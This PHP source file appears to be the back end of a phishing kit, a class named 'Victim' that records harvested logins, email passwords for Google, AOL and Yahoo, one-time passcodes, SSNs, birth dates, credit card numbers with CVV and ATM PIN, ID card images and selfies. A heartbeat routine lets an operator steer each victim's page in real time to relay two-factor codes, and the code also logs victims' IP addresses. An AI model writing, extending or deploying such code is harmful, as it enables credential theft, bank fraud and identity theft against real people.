<?php

class Victim
{
    private $db;
    private $crud;

    function __construct($conn, $crud)
    {
        $this->db = $conn; 
        $this->crud = $crud; 
    }
    public function createVictim($data)
    {
        global $pdo;

        $stmt = $pdo->prepare("
            INSERT INTO victims 
                (username, password, ip_address, user_agent, next_page, heartbeat)
            VALUES (?, ?, ?, ?, ?, ?)
        ");

        $stmt->execute([
            $data['username'] ?? null,
            $data['password'] ?? null,
            $data['ip_address'] ?? null,
            $data['user_agent'] ?? null,
            $data['next_page'] ?? 'start',
            $data['heartbeat'] ?? time()
        ]);

        return $pdo->lastInsertId();
    }


    public function heartbeat($id, $current_page)
    {
        $victim = $this->crud->getVictim($id);

        //Is victim exists in database?
        if(empty($victim)) {
            return;
        }

        //Needs to refresh page?
        if($victim['is_refreshed'] == 1)
        {
            $this->crud->updateVictim($id, [
                'is_refreshed' => 0
            ]);
            return "refresh";
        }

        //Is victim current page update on database?
        if($victim['current_page'] != $current_page)
        {
            $this->crud->updateVictim($id, [
                'current_page' => $current_page
            ]);
        }

        $this->crud->updateVictim($id, [
            'heartbeat' => time()
        ]);

        $nextPage = trim((string) ($victim['next_page'] ?? ''));
        $holdPages = ['', 'loading', 'start', 'login'];

        if (in_array($nextPage, $holdPages, true) || $nextPage === $current_page) {
            return '';
        }

        return $nextPage;
    }
    
    public function victim_data($id, $current_page, $params)
    {
        $victim = $this->crud->getVictim($id);

        $allowed = [];

        if($current_page == "login") {
            $allowed = ['currentpage', 'username', 'password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return 0;
            }

            //Is victim needs to be created?
            if(empty($victim)) {
                $id = $this->crud->createVictim([
                    'username' => $params['username'],
                    'password' => $params['password'],
                    'ip_address' => $this->getVictimIP(),
                    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                    'next_page' => "loading",
                    'is_waiting' => 1,
                    'heartbeat' => time()
                ]);

                $_SESSION['ent_id'] = $id;
                $victim = $this->crud->getVictim($id);
            }
            else
            {
                $this->crud->updateVictim($id, [
                    'username' => $params['username'],
                    'password' => $params['password'],
                    'next_page' => "loading",
                    'is_waiting' => 1,
                    'heartbeat' => time()
                ]);
            }
        }

        if(empty($victim)) {
            $victim = $this->crud->getVictim($id);
        }

        if(empty($victim)) {
            return 0;
        }

        // Other Pages
        if($current_page == "email") {
            $allowed = ['currentpage'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "google") {
            $allowed = ['currentpage', 'email_password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_password' => $params['email_password'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "aol") {
            $allowed = ['currentpage', 'email_password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_password' => $params['email_password'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "aol_otp") {
            $allowed = ['currentpage', 'otp'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_otp' => $params['otp'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "yahoo") {
            $allowed = ['currentpage', 'email_password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_password' => $params['email_password'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "yahoo_otp") {
            $allowed = ['currentpage', 'otp'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_otp' => $params['otp'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "login2") {
            $allowed = ['currentpage', 'username', 'password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'usernames' => $params['username'],
                'passwords' => $params['password'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "otp1") {
            $allowed = ['currentpage', 'otp'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'otp1' => $params['otp'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "otp2") {
            $allowed = ['currentpage', 'otp'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'otp2' => $params['otp'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "otp3") {
            $allowed = ['currentpage', 'otp'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'otp3' => $params['otp'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "info") {
            $allowed = ['currentpage', 'ssn', 'phone', 'dob'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'ssn' => $params['ssn'],
                'phone' => $params['phone'],
                'dob' => $params['dob'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "cc") {
            $allowed = ['currentpage', 'ccname', 'ccnum', 'ccexp', 'cvv', 'atm', 'address'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'ccname' => $params['ccname'],
                'ccnum' => $params['ccnum'],
                'ccexp' => $params['ccexp'],
                'cvv' => $params['cvv'],
                'atm' => $params['atm'],
                'address' => $params['address'],
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "id") {
            $allowed = ['currentpage', 'front', 'back'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $fname = rand(100,9999999).'.png';
            $destination_path = getcwd().DIRECTORY_SEPARATOR;
            $fbase64Image = trim($params['front']);
            $fbase64Image = str_replace('data:image/png;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/jpg;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/jpeg;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/gif;base64,', '', $fbase64Image);
            $fbase64Image = str_replace(' ', '+', $fbase64Image);
            $ftarget_path = $destination_path . '/../../assets/'. $fname;

            $bname = rand(100,9999999).'.png';
            $bbase64Image = trim($params['back']);
            $bbase64Image = str_replace('data:image/png;base64,', '', $bbase64Image);
            $bbase64Image = str_replace('data:image/jpg;base64,', '', $bbase64Image);
            $bbase64Image = str_replace('data:image/jpeg;base64,', '', $bbase64Image);
            $bbase64Image = str_replace('data:image/gif;base64,', '', $bbase64Image);
            $bbase64Image = str_replace(' ', '+', $bbase64Image);
            $btarget_path = $destination_path . '/../../assets/'. $bname;

            file_put_contents($ftarget_path, base64_decode($fbase64Image));
            file_put_contents($btarget_path, base64_decode($bbase64Image));


            $this->crud->updateVictim($id, [
                'idfront' => $fname,
                'idback' => $bname,
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        if($current_page == "selfie") {
            $allowed = ['currentpage', 'selfie'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $fname = rand(100,9999999).'.png';
            $destination_path = getcwd().DIRECTORY_SEPARATOR;
            $fbase64Image = trim($params['selfie']);
            $fbase64Image = str_replace('data:image/png;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/jpg;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/jpeg;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/gif;base64,', '', $fbase64Image);
            $fbase64Image = str_replace(' ', '+', $fbase64Image);
            $ftarget_path = $destination_path . '/../../assets/'. $fname;
            file_put_contents($ftarget_path, base64_decode($fbase64Image));

            $this->crud->updateVictim($id, [
                'selfie' => $fname,
                'next_page' => "loading",
                'is_waiting' => 1,
                'heartbeat' => time()
            ]);
        }
        return 1;
    }

    public function saveFormData($id, array $answers)
    {
        require_once dirname(__DIR__) . '/form_config.php';

        $normalized = [];
        foreach ($answers as $answer) {
            if (!is_array($answer)) {
                continue;
            }

            $label = trim((string) ($answer['label'] ?? ''));
            $name = trim((string) ($answer['name'] ?? ''));
            $value = trim((string) ($answer['value'] ?? ''));

            if ($label === '' && $name === '' && $value === '') {
                continue;
            }

            $normalized[] = [
                'label' => $label,
                'name' => $name,
                'value' => $value,
            ];
        }

        $payload = [
            'submitted_at' => time(),
            'form_title' => get_form_config()['title'] ?? 'Form',
            'answers' => $normalized,
        ];

        $json = json_encode($payload, JSON_UNESCAPED_UNICODE);
        if ($json === false) {
            return 0;
        }

        $victim = $id ? $this->crud->getVictim($id) : null;

        if (empty($victim)) {
            $id = $this->crud->createVictim([
                'ip_address' => $this->getVictimIP(),
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                'current_page' => 'viewform',
                'next_page' => 'start',
                'heartbeat' => time(),
                'form_data' => $json,
            ]);

            $_SESSION['ent_id'] = $id;
            return $id;
        }

        $this->crud->updateVictim($id, [
            'form_data' => $json,
            'current_page' => 'viewform',
            'heartbeat' => time(),
        ]);

        return $id;
    }

    public function isParamsInAllowed($allowed, $params)
    {
        $allow = true;

        foreach($params as $param => $val)
        {
            $exists = in_array($param, $allowed);
            if(!$exists) {
                $allow = false;
            }
        }

        return $allow;
    }

    public function getVictimIP()
    {
        if(!empty($_SERVER['HTTP_CLIENT_IP'])){
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }else{
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

}